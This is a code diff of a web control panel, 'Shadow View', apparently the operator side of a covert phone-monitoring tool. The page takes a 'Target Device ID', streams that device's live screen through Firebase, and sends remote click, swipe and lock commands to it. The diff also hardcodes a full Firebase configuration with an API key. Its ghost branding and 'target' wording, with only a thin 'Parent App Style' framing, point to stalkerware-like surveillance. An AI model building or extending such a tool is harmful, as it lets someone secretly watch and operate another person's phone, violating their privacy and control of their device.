@@ -3,10 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Shadow Admin Panel</title>
+    <title>Shadow View (Auto Connect)</title>
     
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+    
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
 
     <style>
         :root {
@@ -22,7 +24,27 @@
             font-family: 'Segoe UI', sans-serif; height: 100vh; display: flex; flex-direction: column; overflow: hidden;
         }
 
-        /* --- Header --- */
+        /* --- LOGIN OVERLAY (Parent App Style) --- */
+        #loginOverlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.95); z-index: 10000;
+            display: flex; flex-direction: column; justify-content: center; align-items: center;
+        }
+        .login-box {
+            background: #1a1a1a; padding: 30px; border-radius: 15px; border: 1px solid #333;
+            text-align: center; width: 300px;
+        }
+        .login-input {
+            width: 90%; padding: 12px; margin: 20px 0; background: #000; border: 1px solid #444;
+            color: white; border-radius: 5px; font-size: 1.1rem; text-align: center; outline: none;
+        }
+        .login-input:focus { border-color: var(--accent); }
+        .login-btn {
+            background: var(--accent); color: black; padding: 12px 20px; border: none;
+            border-radius: 5px; font-weight: bold; cursor: pointer; width: 100%; font-size: 1rem;
+        }
+
+        /* --- MAIN UI --- */
         .top-nav {
             padding: 15px 20px; background: var(--panel-bg); border-bottom: 1px solid #333;
             display: flex; justify-content: space-between; align-items: center; z-index: 200;
@@ -32,12 +54,10 @@
         .live-dot { height: 10px; width: 10px; background-color: var(--danger); border-radius: 50%; box-shadow: 0 0 5px var(--danger); }
         .live-dot.active { background-color: var(--accent); box-shadow: 0 0 8px var(--accent); }
 
-        /* --- Screen Container --- */
         .screen-container {
             flex: 1; display: flex; justify-content: center; align-items: center; padding: 20px; position: relative;
         }
 
-        /* --- Phone Frame (Laptop Style) --- */
         .phone-frame {
             width: 320px; height: 650px; border: 8px solid #222; border-radius: 30px;
             background: #000; position: relative; box-shadow: 0 0 50px rgba(0,0,0,0.5);
@@ -47,7 +67,7 @@
 
         #screenStream { 
             width: 100%; height: 100%; object-fit: contain; 
-            z-index: 1; 
+            z-index: 1; cursor: crosshair;
         }
         
         .offline-msg { 
@@ -55,7 +75,6 @@
             display: flex; flex-direction: column; align-items: center; z-index: 0; 
         }
 
-        /* --- Side Panel (Right Side Controls) --- */
         .side-panel {
             position: absolute; right: 30px; display: flex; flex-direction: column; gap: 15px;
             background: rgba(26, 26, 26, 0.8); padding: 15px; border-radius: 20px; border: 1px solid #333;
@@ -66,60 +85,51 @@
             color: white; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: 0.2s; font-size: 1.2rem;
         }
         .control-btn:active { transform: scale(0.9); background: var(--accent); color: black; }
+        .logout-btn { border-color: var(--danger); color: var(--danger); }
 
-        /* --- 3 BUTTONS (Ye Gayab nahi honge ab) --- */
         .nav-bar {
             width: 100%; height: 60px; background: rgba(0, 0, 0, 0.9);
             position: absolute; bottom: 0; left: 0; 
             display: flex; justify-content: space-around; align-items: center; border-top: 1px solid #333;
-            z-index: 9999; /* Sabse Upar */
+            z-index: 9999;
         }
         .nav-item { color: #888; font-size: 1.5rem; cursor: pointer; padding: 15px; width: 100%; text-align: center; }
         .nav-item:active { color: var(--accent); background: rgba(255,255,255,0.1); }
 
-
-        /* 🔥 MOBILE SPECIFIC SETTINGS (Jo tumne manga) */
         @media (max-width: 768px) {
-            .top-nav { display: none; } /* Mobile me Header gayab */
-            
+            .top-nav { display: none; }
             .screen-container { padding: 0; height: 100vh; width: 100vw; background: black; }
-            
-            .phone-frame { 
-                width: 100%; height: 100%; 
-                border: none; border-radius: 0; 
-                box-shadow: none; 
-            }
-
-            /* Nav Bar ko Phone ke bottom me chipka diya */
+            .phone-frame { width: 100%; height: 100%; border: none; border-radius: 0; box-shadow: none; }
             .nav-bar { position: fixed; bottom: 0; width: 100%; height: 70px; }
-
-            /* Side Panel Adjustments for Phone */
-            .side-panel { 
-                right: 10px; bottom: 100px; /* Thoda upar taaki nav bar na chhupe */
-                background: transparent; border: none; padding: 0;
-            }
-            
-            /* 🔥 Lock ke niche wala sab gayab (Phone pe) */
+            .side-panel { right: 10px; bottom: 100px; background: transparent; border: none; padding: 0; }
             .hide-on-mobile { display: none !important; }
         }
     </style>
 </head>
 <body>
 
+    <div id="loginOverlay">
+        <div class="login-box">
+            <h2 style="color:var(--accent); margin:0;">DEVICE LOGIN</h2>
+            <p style="color:#888; font-size:0.8rem;">Enter Target Device ID</p>
+            <input type="text" id="deviceIdInput" class="login-input" placeholder="e.g. device_12345">
+            <button class="login-btn" onclick="saveAndConnect()">CONNECT</button>
+        </div>
+    </div>
+
     <div class="top-nav">
-        <div class="brand"><i class="fa-solid fa-ghost"></i> SHADOW</div>
+        <div class="brand"><i class="fa-solid fa-ghost"></i> SHADOW VIEW</div>
         <div class="status-badge">
             <span class="live-dot" id="dot"></span> 
-            <span id="statusText" style="color:#888">Waiting...</span>
+            <span id="statusText" style="color:#888">Initializing...</span>
         </div>
     </div>
 
     <div class="screen-container">
         <div class="phone-frame">
-            
             <div id="offlineMsg" class="offline-msg">
-                <i class="fa-solid fa-spinner fa-spin fa-2x"></i>
-                <p style="margin-top:10px" id="msgText">Connecting...</p>
+                <i class="fa-solid fa-satellite-dish fa-2x"></i>
+                <p style="margin-top:10px" id="msgText">Waiting for Video...</p>
             </div>
             
             <img id="screenStream" src="" alt="" onclick="sendClick(event)">
@@ -133,85 +143,120 @@
 
         <div class="side-panel">
             <div class="control-btn" onclick="sendCommand('lock')" title="Lock/Unlock"><i class="fa-solid fa-power-off"></i></div>
-            
             <div class="control-btn hide-on-mobile" onclick="sendCommand('swipe_up')" title="Scroll Down"><i class="fa-solid fa-arrow-up"></i></div>
             <div class="control-btn hide-on-mobile" onclick="sendCommand('swipe_down')" title="Scroll Up"><i class="fa-solid fa-arrow-down"></i></div>
-            <div class="control-btn hide-on-mobile" onclick="sendCommand('volume_up')" title="Vol +"><i class="fa-solid fa-plus"></i></div>
-            <div class="control-btn hide-on-mobile" onclick="sendCommand('volume_down')" title="Vol -"><i class="fa-solid fa-minus"></i></div>
+            
+            <div class="control-btn logout-btn" onclick="logout()" title="Change Device ID"><i class="fa-solid fa-right-from-bracket"></i></div>
         </div>
     </div>
 
     <script>
-        const SERVER_URL = "https://child-v9no.onrender.com"; 
-        let socket = null;
+        // --------------------------------------------------------------
+        // 🔥 YOUR FIREBASE CONFIG
+        // --------------------------------------------------------------
+        const firebaseConfig = {
+            apiKey: "AIzaSyDs5ubX4MGyVoCHIJXXgWBpU7wgoS5jcDM",
+            authDomain: "childapp-ce1fe.firebaseapp.com",
+            databaseURL: "https://childapp-ce1fe-default-rtdb.firebaseio.com",
+            projectId: "childapp-ce1fe",
+            storageBucket: "childapp-ce1fe.firebasestorage.app",
+            messagingSenderId: "108035285372",
+            appId: "1:108035285372:android:33bf86d5b727a1a17944f9"
+        };
+
+        if (!firebase.apps.length) {
+            firebase.initializeApp(firebaseConfig);
+        }
+        const database = firebase.database();
+
+        // --------------------------------------------------------------
+        
         let currentDeviceId = null;
+        const STORAGE_KEY = 'shadow_device_id'; // Same key for all apps
+        
+        const statusText = document.getElementById('statusText');
+        const offlineMsg = document.getElementById('offlineMsg');
+        const dot = document.getElementById('dot');
+        const img = document.getElementById('screenStream');
+        const loginOverlay = document.getElementById('loginOverlay');
 
+        // 🔥 STEP 1: LOAD SAVED ID
         window.onload = function() {
-            const urlParams = new URLSearchParams(window.location.search);
-            currentDeviceId = urlParams.get('id');
+            const savedId = localStorage.getItem(STORAGE_KEY);
 
-            if (currentDeviceId) {
-                document.getElementById('statusText').innerText = "ID: " + currentDeviceId;
-                startConnection(); 
+            if (savedId) {
+                // ID Found -> Connect directly
+                console.log("Auto-connecting to:", savedId);
+                loginOverlay.style.display = "none";
+                currentDeviceId = savedId;
+                startListening();
             } else {
-                document.getElementById('msgText').innerText = "No ID Provided";
+                // No ID -> Show Login Box
+                loginOverlay.style.display = "flex";
             }
         };
 
-        function startConnection() {
-            socket = io(SERVER_URL, { transports: ['websocket', 'polling'] });
+        // 🔥 STEP 2: SAVE ID AND CONNECT
+        function saveAndConnect() {
+            const inputVal = document.getElementById('deviceIdInput').value.trim();
+            if(inputVal.length > 0) {
+                localStorage.setItem(STORAGE_KEY, inputVal); // Save permanently
+                currentDeviceId = inputVal;
+                loginOverlay.style.display = "none";
+                startListening();
+            } else {
+                alert("Please enter a valid Device ID");
+            }
+        }
 
-            socket.on("connect", () => {
-                console.log("Connected!");
-                document.getElementById('statusText').innerText = "Online";
-                document.getElementById('statusText').style.color = "var(--accent)";
-                document.getElementById('dot').classList.add("active");
-                socket.emit("join", currentDeviceId); 
-            });
+        // 🔥 STEP 3: LOGOUT / CHANGE ID
+        function logout() {
+            if(confirm("Change Target Device ID?")) {
+                localStorage.removeItem(STORAGE_KEY);
+                location.reload(); // Refresh to show login box
+            }
+        }
 
-            socket.on("disconnect", () => {
-                document.getElementById('statusText').innerText = "Offline";
-                document.getElementById('statusText').style.color = "var(--danger)";
-                document.getElementById('dot').classList.remove("active");
-                document.getElementById('offlineMsg').style.display = "flex";
-            });
+        // --- MAIN LOGIC ---
+        function startListening() {
+            statusText.innerText = "Target: " + currentDeviceId;
+            
+            const screenRef = database.ref("live_screens/" + currentDeviceId + "/image");
 
-            // Auto-Detect Image Format
-            socket.on("screen-data", (data) => {
-                document.getElementById('offlineMsg').style.display = "none";
-                const img = document.getElementById('screenStream');
-                
-                if (!data.image) return;
+            screenRef.on("value", (snapshot) => {
+                const base64String = snapshot.val();
 
-                let prefix = "data:image/webp;base64,"; 
-                if (data.image.startsWith("/9j/")) prefix = "data:image/jpeg;base64,";
-                
-                if (data.image.startsWith("data:image")) {
-                    img.src = data.image;
+                if (base64String) {
+                    img.src = "data:image/jpeg;base64," + base64String;
+                    offlineMsg.style.display = "none";
+                    dot.classList.add("active");
+                    statusText.innerText = "Online: " + currentDeviceId;
+                    statusText.style.color = "var(--accent)";
                 } else {
-                    img.src = prefix + data.image;
+                    dot.classList.remove("active");
+                    // Don't show offline msg immediately to avoid flicker, let user see last frame
                 }
+            }, (error) => {
+                console.error("Firebase Error:", error);
+                statusText.innerText = "Connection Error";
+                statusText.style.color = "red";
             });
         }
 
         function sendCommand(action) {
-            if(!socket) return;
-            if(navigator.vibrate) navigator.vibrate(30);
-            socket.emit("control-event", { room: currentDeviceId, action: action });
+            if(!currentDeviceId) return;
+            database.ref("live_screens/" + currentDeviceId + "/command").set({
+                action: action, timestamp: Date.now()
+            });
         }
 
         function sendClick(event) {
-            if(!socket) return;
-            const img = document.getElementById('screenStream');
+            if(!currentDeviceId) return;
             const rect = img.getBoundingClientRect();
-            
             const x = Math.round(event.clientX - rect.left);
             const y = Math.round(event.clientY - rect.top);
-
-            socket.emit("control-event", {
-                room: currentDeviceId,
-                action: "click",
-                x: x, y: y
+            database.ref("live_screens/" + currentDeviceId + "/command").set({
+                action: "click", x: x, y: y, timestamp: Date.now()
             });
         }
     </script>
